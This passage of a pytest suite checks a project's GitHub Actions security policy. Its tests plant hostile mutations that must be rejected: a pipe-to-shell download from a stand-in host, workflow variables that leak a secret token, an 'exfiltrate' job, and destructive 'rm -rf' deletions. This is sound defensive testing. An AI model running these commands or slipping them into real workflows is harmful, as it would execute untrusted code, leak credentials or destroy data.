            '  if [ "$result" != "success" ]; then\n'
            "    failed=1\n"
            "  fi\n"
            "done\n"
            'exit "$failed"\n'
        ),
    },
]

_EXPECTED_JOBS: dict[str, dict[str, object]] = {
    "secrets": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "10",
        "steps": _SECRETS_STEPS,
    },
    "lint": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "15",
        "steps": _LINT_STEPS,
    },
    "test": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "30",
        "strategy": {
            "fail-fast": "false",
            "matrix": {"shard": ["1", "2", "3", "4"]},
        },
        "env": {"SHARD_TOTAL": "4"},
        "services": {
            "postgres": {
                "image": (
                    "postgres@sha256:"
                    "9e73daeb439141c2b11eea2463f5f1a3b269fd90d897b41cddb7cb440f21aa5d"
                ),
                "env": {"POSTGRES_HOST_AUTH_METHOD": "trust", "POSTGRES_DB": "seeon_test"},
                "command": "-c fsync=on -c synchronous_commit=on -c max_connections=200",
                "ports": ["5432:5432"],
                "options": (
                    '--health-cmd "pg_isready -h 127.0.0.1 -U postgres -d seeon_test"'
                    " --health-interval 2s --health-timeout 5s --health-retries 30"
                ),
            }
        },
        "steps": _TEST_STEPS,
    },
    "ci-ok": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "5",
        "needs": ["secrets", "lint", "test"],
        "if": "always()",
        "steps": _CI_OK_STEPS,
    },
}


def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
    assert set(workflow) == {"concurrency", "jobs", "name", "on", "permissions"}

    assert workflow["on"] == {
        "pull_request": "",
        "push": {"branches": ["main"]},
    }
    assert workflow["permissions"] == {"contents": "read"}

    assert workflow["concurrency"] == {
        "group": "ci-${{ github.workflow }}-${{ github.ref }}",
        "cancel-in-progress": "${{ github.event_name == 'pull_request' }}",
    }

    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert set(jobs) == set(_EXPECTED_JOBS)

    for name, expected in _EXPECTED_JOBS.items():
        job = jobs[name]
        assert isinstance(job, dict), name
        assert set(job) == set(expected), name
        assert job == expected, name

        steps = job["steps"]
        assert isinstance(steps, list), name
        for step in steps:
            assert isinstance(step, dict), name
            if "uses" in step:
                assert _ACTION_PIN.match(str(step["uses"])), (name, step["uses"])

    assert "fetch-models" not in yaml.safe_dump(jobs)
    assert "HF_TOKEN" not in yaml.safe_dump(jobs)
    assert "${{ secrets." not in yaml.safe_dump(jobs["test"])

    serialized = yaml.safe_dump({key: value for key, value in workflow.items() if key != "jobs"})
    assert "eldercare-dataset-ops" not in serialized
    assert "DATASET_OPS_TOKEN" not in serialized
    assert ".dataset-ops" not in serialized
    assert "upload-artifact" not in serialized
    assert "actions/cache" not in serialized
    assert "${{ secrets." not in serialized
    for job_name, job in jobs.items():
        if _NOT_A_PULL_REQUEST_IF not in str(job.get("if", "")):
            assert "${{ secrets." not in yaml.safe_dump(job), job_name


@pytest.mark.parametrize("mode", [b"120000", b"160000"])
def test_index_policy_rejects_linkage_modes(mode: bytes) -> None:
    with pytest.raises(AssertionError):
        _validate_index_mode(mode, b"synthetic-link")


def test_untrusted_ci_has_no_private_repository_access() -> None:
    _assert_untrusted_ci_security(_workflow("ci.yml"))


@pytest.mark.parametrize(
    ("job", "step_index", "field", "value"),
    [
        ("secrets", 0, "uses", "actions/checkout@v4"),
        ("lint", 0, "uses", "actions/checkout@v4"),
        ("lint", 1, "uses", "astral-sh/setup-uv@v5"),
        ("test", 0, "uses", "actions/checkout@v4"),
        ("test", 1, "uses", "astral-sh/setup-uv@v5"),
        ("secrets", 1, "run", "echo gitleaks@sha256:placeholder"),
        ("lint", 2, "run", "curl https://example.invalid/install | sh"),
        ("test", 2, "run", "curl https://example.invalid/install | sh"),
        ("lint", 3, "run", "uvx ruff check ."),
        ("test", 4, "run", "uv run pytest -q tests/"),
        ("ci-ok", 0, "run", "true"),
    ],
)
def test_untrusted_ci_policy_rejects_security_mutations(
    job: str, step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    target = jobs[job]
    assert isinstance(target, dict)
    steps = target["steps"]
    assert isinstance(steps, list)
    steps[step_index][field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("on", {"push": "", "pull_request": ""}),
        ("on", {"push": {"branches": ["main"]}, "pull_request": {"paths": ["src/**"]}}),
        ("permissions", {"contents": "write"}),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("defaults", {"run": {"shell": "bash"}}),
        ("concurrency", {"group": "ci", "cancel-in-progress": "true"}),
    ],
)
def test_untrusted_ci_policy_rejects_boundary_mutations(field: str, value: object) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    workflow[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_extra_job() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    jobs["exfiltrate"] = {"runs-on": "ubuntu-latest", "steps": []}

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_removed_job() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    del jobs["secrets"]

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize("job", ["secrets", "lint", "test", "ci-ok"])
def test_untrusted_ci_policy_rejects_cache_step(job: str) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    target = jobs[job]
    assert isinstance(target, dict)
    steps = target["steps"]
    assert isinstance(steps, list)
    steps.append(
        {
            "uses": "actions/cache@0000000000000000000000000000000000000000",
            "with": {"path": "models", "key": "models-pinned-revision"},
        }
    )

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_uv_cache_opt_in() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    lint = jobs["lint"]
    assert isinstance(lint, dict)
    steps = lint["steps"]
    assert isinstance(steps, list)
    steps[1]["with"]["enable-cache"] = "true"

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("continue-on-error", "true"),
        ("if", "false"),
        ("runs-on", "self-hosted"),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("permissions", {"contents": "write"}),
        ("container", "ghcr.io/example/untrusted:latest"),
    ],
)
def test_untrusted_ci_policy_rejects_job_mutations(field: str, value: object) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    job[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_shard_matrix_change() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    strategy = job["strategy"]
    assert isinstance(strategy, dict)
    strategy["matrix"] = {"shard": ["1", "2"]}

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


_WORKFLOW_DIR = Path(".github/workflows")

_PUSH_GATE = "env.PUSH_IMAGES == 'true'"
_PUSH_GATE_EXPR = "${{ env.PUSH_IMAGES == 'true' }}"
_CACHE_GATE_PREFIX = "${{ env.PUSH_IMAGES == 'true' && "
_CACHE_GATE_SUFFIX = " || '' }}"
_NOT_A_PULL_REQUEST = "${{ github.event_name != 'pull_request' }}"
_NOT_A_PULL_REQUEST_IF = "github.event_name != 'pull_request'"

_REGISTRY_WRITE_MARKERS = ("imagetools create", "edge_image_plan.py retag", "docker push")

_EDGE_DOCKERFILE = "Dockerfile.edge"

_SMOKE_STAGE_IF = "env.BUILD_ML_WORKER == 'true' && env.RELEASE_BUILD != 'true'"
_SMOKE_PULL_IF = "env.BUILD_ML_WORKER != 'true' || env.RELEASE_BUILD == 'true'"
_LOCAL_SMOKE_REF = 'SMOKE_REF="$IMAGE_NAMESPACE/ml-worker:$DEPLOY_SHA"'

_WRITE_PERMISSION_HOLDERS: dict[tuple[str, str], set[str]] = {
    ("edge-images.yml", "publish"): {"packages"},
}


def _tracked_workflows() -> dict[str, dict[str, object]]:
    workflows: dict[str, dict[str, object]] = {}
    for relative, blob in _index_blobs():
        if relative.parent != _WORKFLOW_DIR or relative.suffix not in {".yml", ".yaml"}:
            continue
        loaded = yaml.load(blob, Loader=yaml.BaseLoader)
        assert isinstance(loaded, dict), relative
        workflows[relative.name] = loaded
    assert workflows, "no tracked workflow was discovered -- the walk is broken"
    return workflows


def _trigger_names(workflow: dict[str, object]) -> set[str]:
    triggers = workflow["on"]
    if isinstance(triggers, dict):
        return set(triggers)
    if isinstance(triggers, list):
        return {str(item) for item in triggers}
    return {str(triggers)}


def _pull_request_workflows() -> dict[str, dict[str, object]]:
    found = {
        name: workflow
        for name, workflow in _tracked_workflows().items()
        if "pull_request" in _trigger_names(workflow)
    }
    assert {"ci.yml", "edge-images.yml"} <= set(found), sorted(found)
    return found


def _jobs(workflow: dict[str, object]) -> dict[str, dict[str, object]]:
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    for name, job in jobs.items():
        assert isinstance(job, dict), name
    return jobs


def _steps(job: dict[str, object]) -> list[dict[str, object]]:
    steps = job.get("steps", [])
    assert isinstance(steps, list)
    for step in steps:
        assert isinstance(step, dict)
    return steps


def _count_pinned_actions(name: str, workflow: dict[str, object]) -> int:
    pinned = 0
    for job_name, job in _jobs(workflow).items():
        for step in _steps(job):
            if "uses" not in step:
                continue
            pinned += 1
            assert _ACTION_PIN.match(str(step["uses"])), (name, job_name, step["uses"])
    return pinned


def _assert_no_pull_request_secret_access(name: str, workflow: dict[str, object]) -> None:
    top_level = {key: value for key, value in workflow.items() if key != "jobs"}
    assert "${{ secrets." not in yaml.safe_dump(top_level), name
    for job_name, job in _jobs(workflow).items():
        if _NOT_A_PULL_REQUEST_IF in str(job.get("if", "")):
            continue
        assert "${{ secrets." not in yaml.safe_dump(job), (name, job_name)


def _assert_token_consumers_are_gated(name: str, job_name: str, job: dict[str, object]) -> None:
    env = job.get("env")
    assert isinstance(env, dict), (name, job_name)
    assert env.get("PUSH_IMAGES") == _NOT_A_PULL_REQUEST, (name, job_name, env)

    logins = uploads = pushes = exports = retags = smokes = 0
    for step in _steps(job):
        uses = str(step.get("uses", ""))
        with_ = step.get("with") or {}
        assert isinstance(with_, dict), (name, step.get("name"))
        if uses.startswith("docker/login-action@"):
            logins += 1
            assert step.get("if") == _PUSH_GATE, (name, step.get("name"), step.get("if"))
        if uses.startswith("actions/upload-artifact@"):
            uploads += 1
            assert step.get("if") == _PUSH_GATE, (name, step.get("name"), step.get("if"))
        if _LOCAL_SMOKE_REF in str(step.get("run", "")):
            smokes += 1
            assert step.get("if") == _SMOKE_STAGE_IF, (name, step.get("name"), step.get("if"))
            assert "docker run --pull never --rm --network none" in str(step["run"])
            assert "python -m worker --check-config" in str(step["run"])
        if "push" in with_:
            pushes += 1
            assert with_["push"] == _PUSH_GATE_EXPR, (name, step.get("name"), with_["push"])
        if "cache-to" in with_:
            exports += 1
            cache_to = str(with_["cache-to"])
            assert cache_to.startswith(_CACHE_GATE_PREFIX), (name, step.get("name"), cache_to)
            assert cache_to.endswith(_CACHE_GATE_SUFFIX), (name, step.get("name"), cache_to)
        if any(marker in str(step.get("run", "")) for marker in _REGISTRY_WRITE_MARKERS):
            retags += 1
            assert _PUSH_GATE in str(step.get("if", "")), (
                name,
                step.get("name"),
                step.get("if"),
            )

    assert (logins, uploads, pushes, exports, retags, smokes) == (1, 1, 2, 2, 2, 1), (
        name,
        job_name,
        (logins, uploads, pushes, exports, retags, smokes),
    )


def _assert_write_permissions_stay_off_the_pull_request_path(
    name: str, workflow: dict[str, object]
) -> None:
    permissions = workflow.get("permissions")
    assert isinstance(permissions, dict), (name, permissions)
    assert not [scope for scope, level in permissions.items() if level != "read"], (
        name,
        permissions,
    )

    for job_name, job in _jobs(workflow).items():
        job_permissions = job.get("permissions")
        if job_permissions is None:
            continue
        assert isinstance(job_permissions, dict), (name, job_name)
        writes = {scope for scope, level in job_permissions.items() if level != "read"}
        if not writes:
            continue
        allowed = _WRITE_PERMISSION_HOLDERS.get((name, job_name))
        assert allowed is not None, (name, job_name, writes)
        assert writes == allowed, (name, job_name, writes)
        _assert_token_consumers_are_gated(name, job_name, job)


def test_every_pull_request_workflow_pins_actions_to_a_commit() -> None:
    pinned = sum(
        _count_pinned_actions(name, workflow)
        for name, workflow in _pull_request_workflows().items()
    )
    assert pinned >= 11, pinned


def test_no_pull_request_workflow_reads_a_secret() -> None:
    for name, workflow in _pull_request_workflows().items():
        _assert_no_pull_request_secret_access(name, workflow)


def test_pull_request_workflows_grant_no_write_scope_they_can_spend() -> None:
    for name, workflow in _pull_request_workflows().items():
        _assert_write_permissions_stay_off_the_pull_request_path(name, workflow)


_PUBLISH_STEP_SEQUENCE: tuple[tuple[str, str | None], ...] = (
    ("", "actions/checkout@"),
    ("Resolve deploy SHA", None),
    ("Prepare hosted runner disk", None),
    ("Share Docker image storage", None),
    ("Set up Docker Buildx", "docker/setup-buildx-action@"),
    ("Login to GitHub Container Registry", "docker/login-action@"),
    ("Decide, per image", None),
    ("Build and push ml-api", "docker/build-push-action@"),
    ("Build and push ml-worker", "docker/build-push-action@"),
    ("Boot smoke test", None),
    ("Re-tag the published ml-api", None),
    ("Re-tag the published ml-worker", None),
    ("Resolve the digests", None),
    ("Boot smoke test", None),
    ("Write edge image env artifact", None),
    ("Upload edge image refs", "actions/upload-artifact@"),
)


def test_edge_image_publish_step_sequence_is_pinned() -> None:
    steps = _steps(_jobs(_workflow("edge-images.yml"))["publish"])
    assert len(steps) == len(_PUBLISH_STEP_SEQUENCE), len(steps)
    for index, (fragment, uses_prefix) in enumerate(_PUBLISH_STEP_SEQUENCE):
        step = steps[index]
        assert fragment in str(step.get("name", "")), (index, step.get("name"))
        if uses_prefix is None:
            assert "uses" not in step, (index, step.get("uses"))
        else:
            assert str(step.get("uses", "")).startswith(uses_prefix), (index, step.get("uses"))


_HOSTED_RUNNER_DISK_STEP = {
    "name": "Prepare hosted runner disk for DeepStream",
    "if": "runner.environment == 'github-hosted' && runner.os == 'Linux'",
    "run": (
        "set -euo pipefail\n"
        "df -h /\n"
        "sudo rm -rf -- /usr/local/lib/android /usr/share/dotnet \\\n"
        "  /usr/share/swift /usr/local/.ghcup/ghc\n"
        "df -h /\n"
    ),
}


def _assert_bounded_hosted_runner_disk_preparation(workflow: dict[str, object]) -> None:
    steps = _steps(_jobs(workflow)["publish"])
    capacity = [step for step in steps if step.get("name") == _HOSTED_RUNNER_DISK_STEP["name"]]
    assert capacity == [_HOSTED_RUNNER_DISK_STEP], capacity
    assert steps.index(capacity[0]) == 2


def test_edge_image_runner_cleanup_is_hosted_only_and_path_bounded() -> None:
    _assert_bounded_hosted_runner_disk_preparation(_workflow("edge-images.yml"))


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("if", "always()"),
        ("if", "runner.environment == 'self-hosted'"),
        ("if", "runner.os == 'Linux'"),
        ("run", "sudo rm -rf -- /var/lib/docker\n"),
        ("run", 'sudo rm -rf -- "$GITHUB_WORKSPACE"\n'),
        ("run", 'sudo rm -rf -- "$HOME/.cache"\n'),
        ("run", "sudo rm -rf -- /usr/local/lib/android /usr/share/dotnet\n"),
    ],
)
def test_edge_image_runner_cleanup_rejects_unsafe_changes(field: str, value: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["steps"][2][field] = value

    with pytest.raises(AssertionError):
        _assert_bounded_hosted_runner_disk_preparation(workflow)


def test_edge_image_runner_cleanup_cannot_be_dropped() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    del _jobs(workflow)["publish"]["steps"][2]

    with pytest.raises(AssertionError):
        _assert_bounded_hosted_runner_disk_preparation(workflow)


_SHARED_DOCKER_STORAGE_SCRIPT = (
    "set -euo pipefail\n"
    "sudo python3 - <<'PYCONFIG'\n"
    "import json\n"
    "import subprocess\n"
    "from pathlib import Path\n"
    'path = Path("/etc/docker/daemon.json")\n'
    "original = path.read_bytes() if path.exists() else None\n"
    "config = json.loads(original) if original is not None else {}\n"
    "if not isinstance(config, dict):\n"
    '    raise SystemExit("Docker daemon configuration must be an object")\n'
    'features = config.setdefault("features", {})\n'
    "if not isinstance(features, dict):\n"
    '    raise SystemExit("Docker daemon features must be an object")\n'
    'features["containerd-snapshotter"] = True\n'
    "try:\n"
    '    path.write_text(json.dumps(config) + "\\n")\n'
    '    subprocess.run(["systemctl", "restart", "docker"], check=True)\n'
    "    status = json.loads(subprocess.check_output(\n"
    '        ["docker", "info", "--format", "{{json .DriverStatus}}"], text=True\n'
    "    ))\n"
    '    if ["driver-type", "io.containerd.snapshotter.v1"] not in status:\n'
    '        raise RuntimeError("Docker containerd image store is not active")\n'
    "except Exception:\n"
    "    if original is None:\n"
    "        path.unlink(missing_ok=True)\n"
    "    else:\n"
    "        path.write_bytes(original)\n"
    '    subprocess.run(["systemctl", "restart", "docker"], check=False)\n'
    "    raise\n"
    "PYCONFIG\n"
    "df -h /\n"
)


def _assert_hosted_shared_docker_storage(workflow: dict[str, object]) -> None:
    steps = _steps(_jobs(workflow)["publish"])
    storage = steps[3]
    assert storage == {
        "name": "Share Docker image storage for build and smoke",
        "if": "runner.environment == 'github-hosted' && runner.os == 'Linux'",
        "run": _SHARED_DOCKER_STORAGE_SCRIPT,
    }
    builder = next(s for s in steps if s.get("name") == "Set up Docker Buildx")
    assert builder["with"] == {"driver": "docker"}


def test_edge_image_storage_is_shared_without_replacing_daemon_config() -> None:
    _assert_hosted_shared_docker_storage(_workflow("edge-images.yml"))


@pytest.mark.parametrize("field", ["if", "run"])
def test_edge_image_storage_rejects_unguarded_or_expanded_changes(field: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["steps"][3][field] = "always()" if field == "if" else "true\n"

    with pytest.raises(AssertionError):
        _assert_hosted_shared_docker_storage(workflow)


def test_edge_image_storage_rejects_a_second_builder_store() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["steps"][4]["with"]["driver"] = "docker-container"

    with pytest.raises(AssertionError):
        _assert_hosted_shared_docker_storage(workflow)


def _docker_storage_setup_python(path: Path) -> str:
    source = _SHARED_DOCKER_STORAGE_SCRIPT.split("sudo python3 - <<'PYCONFIG'\n", 1)[1]
    source = source.split("\nPYCONFIG", 1)[0]
    target = 'Path("/etc/docker/daemon.json")'
    assert source.count(target) == 1
    return source.replace(target, f"Path({str(path)!r})")


@pytest.mark.parametrize(
    "existing", [None, {"log-driver": "json-file", "features": {"buildkit": True}}]
)
def test_edge_image_storage_preserves_existing_config(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, existing: dict[str, object] | None
) -> None:
    config = tmp_path / "daemon.json"
    if existing is not None:
        config.write_text(json.dumps(existing))
    calls: list[list[str]] = []

    def restart(argv: list[str], *, check: bool) -> None:
        assert check
        calls.append(argv)

    def info(argv: list[str], *, text: bool) -> str:
        assert argv == ["docker", "info", "--format", "{{json .DriverStatus}}"]
        assert text
        return '[["driver-type", "io.containerd.snapshotter.v1"]]'

    monkeypatch.setattr(subprocess, "run", restart)
    monkeypatch.setattr(subprocess, "check_output", info)
    exec(compile(_docker_storage_setup_python(config), "daemon-setup", "exec"), {})
    expected = copy.deepcopy(existing) if existing is not None else {}
    expected.setdefault("features", {})["containerd-snapshotter"] = True
    assert json.loads(config.read_text()) == expected
    assert calls == [["systemctl", "restart", "docker"]]


@pytest.mark.parametrize("original", [None, b'{ "log-driver": "json-file" }\n'])
@pytest.mark.parametrize("failure", ["restart", "verify"])
def test_edge_image_storage_restores_config_on_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, original: bytes | None, failure: str
) -> None:
    config = tmp_path / "daemon.json"
    if original is not None:
        config.write_bytes(original)
    calls: list[tuple[list[str], bool]] = []

    def restart(argv: list[str], *, check: bool) -> None:
        calls.append((argv, check))
        if check and failure == "restart":
            raise subprocess.CalledProcessError(1, argv)

    def info(argv: list[str], *, text: bool) -> str:
        del argv, text
        return '[["driver-type", "overlay2"]]'

    monkeypatch.setattr(subprocess, "run", restart)
    monkeypatch.setattr(subprocess, "check_output", info)
    with pytest.raises((subprocess.CalledProcessError, RuntimeError)):
        exec(compile(_docker_storage_setup_python(config), "daemon-setup", "exec"), {})
    assert calls == [
        (["systemctl", "restart", "docker"], True),
        (["systemctl", "restart", "docker"], False),
    ]
    if original is None:
        assert not config.exists()
    else:
        assert config.read_bytes() == original


@pytest.mark.parametrize("original", [b"[]", b'{"features": []}', b"not json"])
def test_edge_image_storage_invalid_config_is_never_overwritten(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, original: bytes
) -> None:
    config = tmp_path / "daemon.json"
    config.write_bytes(original)
    calls: list[tuple[object, ...]] = []

    def forbidden(*args: object, **kwargs: object) -> None:
        del kwargs
        calls.append(args)
        pytest.fail("Invalid daemon config must never invoke service commands")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "check_output", forbidden)
    with pytest.raises((SystemExit, json.JSONDecodeError)):
        exec(compile(_docker_storage_setup_python(config), "daemon-setup", "exec"), {})
    assert config.read_bytes() == original
    assert not calls


def test_the_required_edge_image_check_is_never_gated_off() -> None:
    workflow = _workflow("edge-images.yml")
    triggers = workflow["on"]
    assert isinstance(triggers, dict)
    pull_request = triggers["pull_request"]
    if isinstance(pull_request, dict):
        assert not {"paths", "paths-ignore"} & set(pull_request), pull_request
    else:
        assert pull_request in ("", None), repr(pull_request)

    condition = str(_jobs(workflow)["publish"].get("if", ""))
    assert "pull_request" not in condition, condition
    assert "prerelease" in condition, condition


def test_edge_image_workflow_is_reachable_from_pull_request() -> None:
    workflow = _workflow("edge-images.yml")
    assert "pull_request" in _trigger_names(workflow)
    publish = _jobs(workflow)["publish"]
    assert publish["permissions"] == {"contents": "read", "packages": "write"}
    assert workflow["permissions"] == {"contents": "read"}


@pytest.mark.parametrize(
    ("workflow_name", "job", "step_index", "value"),
    [
        ("edge-images.yml", "publish", 0, "actions/checkout@v4"),
        ("edge-images.yml", "publish", 4, "docker/setup-buildx-action@v3"),
        ("edge-images.yml", "publish", 5, "docker/login-action@v3"),
        ("edge-images.yml", "publish", 7, "docker/build-push-action@v6"),
        ("edge-images.yml", "publish", 8, "docker/build-push-action@v6"),
        ("edge-images.yml", "publish", 15, "actions/upload-artifact@v4"),
        ("edge-images.yml", "publish", 0, "actions/checkout@main"),
        ("edge-images.yml", "publish", 0, "actions/checkout@" + "z" * 40),
        ("ci.yml", "lint", 0, "actions/checkout@v4"),
    ],
)
def test_pull_request_pin_policy_rejects_an_unpinned_action(
    workflow_name: str, job: str, step_index: int, value: str
) -> None:
    workflow = copy.deepcopy(_workflow(workflow_name))
    _jobs(workflow)[job]["steps"][step_index]["uses"] = value

    with pytest.raises(AssertionError):
        _count_pinned_actions(workflow_name, workflow)


@pytest.mark.parametrize(
    ("step_index", "cache_to"),
    [
        (7, "type=gha,scope=edge-ml-api,mode=max"),
        (8, "type=gha,scope=edge-ml-worker,mode=max"),
        (8, "${{ env.PUSH_IMAGES == 'false' && 'type=gha,mode=max' || '' }}"),
        (8, "${{ env.PUSH_IMAGES == 'true' && 'type=gha,mode=max' || 'type=gha' }}"),
    ],
)
def test_edge_image_policy_rejects_an_ungated_cache_export(step_index: int, cache_to: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["steps"][step_index]["with"]["cache-to"] = cache_to

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


@pytest.mark.parametrize(
    ("target", "permissions"),
    [
        ("workflow", {"contents": "read", "packages": "write"}),
        ("workflow", {"contents": "write"}),
        ("job", {"contents": "write", "packages": "write"}),
        ("job", {"contents": "read", "packages": "write", "id-token": "write"}),
    ],
)
def test_edge_image_policy_rejects_a_widened_permission(
    target: str, permissions: dict[str, str]
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    if target == "workflow":
        workflow["permissions"] = permissions
    else:
        _jobs(workflow)["publish"]["permissions"] = permissions

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


def test_edge_image_policy_rejects_a_write_scope_on_a_second_job() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["notify"] = {
        "runs-on": "ubuntu-latest",
        "permissions": {"packages": "write"},
        "steps": [],
    }

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


@pytest.mark.parametrize(
    ("step_index", "field", "value"),
    [
        (5, "if", "always()"),
        (7, "push", "true"),
        (8, "push", "true"),
        (10, "if", "always()"),
        (11, "if", "env.BUILD_ML_WORKER != 'true'"),
        (15, "if", "always()"),
    ],
)
def test_edge_image_policy_rejects_an_ungated_token_consumer(
    step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    step = _jobs(workflow)["publish"]["steps"][step_index]
    if field == "if":
        step["if"] = value
    else:
        step["with"][field] = value

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


@pytest.mark.parametrize(
    ("step_index", "why"),
    [
        (5, "registry login"),
        (9, "boot smoke"),
    ],
)
def test_edge_image_policy_rejects_dropping_a_gated_step(step_index: int, why: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    steps = _jobs(workflow)["publish"]["steps"]
    del steps[step_index]

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


def _assert_edge_image_boot_smoke_and_direct_load(workflow: dict[str, object]) -> None:
    steps = _steps(_jobs(workflow)["publish"])
    stage = [s for s in steps if _LOCAL_SMOKE_REF in str(s.get("run", ""))]
    pull = [s for s in steps if "docker pull" in str(s.get("run", ""))]
    assert len(stage) == 1, [s.get("name") for s in stage]
    assert len(pull) == 1, [s.get("name") for s in pull]
    assert stage[0]["if"] == _SMOKE_STAGE_IF, stage[0].get("if")
    assert pull[0]["if"] == _SMOKE_PULL_IF, pull[0].get("if")
    local_run = str(stage[0]["run"])
    assert "docker image inspect" in local_run
    assert 'test "$revision" = "$DEPLOY_SHA"' in local_run
    assert "org.opencontainers.image.revision" in local_run
    assert "docker run --pull never --rm --network none" in local_run
    assert "python -m worker --check-config" in local_run
    assert "docker load" not in local_run
    assert "python -m worker --check-config" in str(pull[0]["run"])
    worker = next(s for s in steps if s.get("name") == "Build and push ml-worker image")
    assert worker["with"]["load"] == "${{ env.RELEASE_BUILD != 'true' }}"
    assert "outputs" not in worker["with"]
    assert worker["with"]["provenance"] == "${{ env.RELEASE_BUILD == 'true' }}"
    assert worker["with"]["push"] == _PUSH_GATE_EXPR
    assert 'SMOKE_REF="$IMAGE_NAMESPACE/ml-worker@$ML_WORKER_DIGEST"' in str(pull[0]["run"])


def test_edge_image_boot_smoke_shapes_are_exact_complements() -> None:
    _assert_edge_image_boot_smoke_and_direct_load(_workflow("edge-images.yml"))


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("load", "false"),
        ("load", "true"),
        ("load", "${{ env.RELEASE_BUILD == 'true' }}"),
        ("outputs", "type=docker,dest=/tmp/ml-worker-runtime.tar"),
        ("provenance", "false"),
    ],
)
def test_edge_image_direct_load_rejects_wrong_exporter(field: str, value: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    steps = _steps(_jobs(workflow)["publish"])
    worker = next(s for s in steps if s.get("id") == "build-worker")
    worker["with"][field] = value

    with pytest.raises(AssertionError):
        _assert_edge_image_boot_smoke_and_direct_load(workflow)


@pytest.mark.parametrize(
    ("before", "after"),
    [
        ("--pull never ", ""),
        ('test "$revision" = "$DEPLOY_SHA"', "true"),
        ("python -m worker --check-config", "true"),
        ("--network none", "--network host"),
    ],
)
def test_edge_image_local_smoke_rejects_weakened_proof(before: str, after: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    steps = _steps(_jobs(workflow)["publish"])
    smoke = next(s for s in steps if _LOCAL_SMOKE_REF in str(s.get("run", "")))
    smoke["run"] = str(smoke["run"]).replace(before, after)

    with pytest.raises(AssertionError):
        _assert_edge_image_boot_smoke_and_direct_load(workflow)


def test_edge_image_policy_rejects_a_push_images_flag_that_is_true_on_a_pr() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["env"]["PUSH_IMAGES"] = "true"

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path("edge-images.yml", workflow)


@pytest.mark.parametrize(
    ("target", "value"),
    [
        ("workflow", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("job", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
    ],
)
def test_pull_request_secret_policy_rejects_a_secret_reference(
    target: str, value: dict[str, str]
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    if target == "workflow":
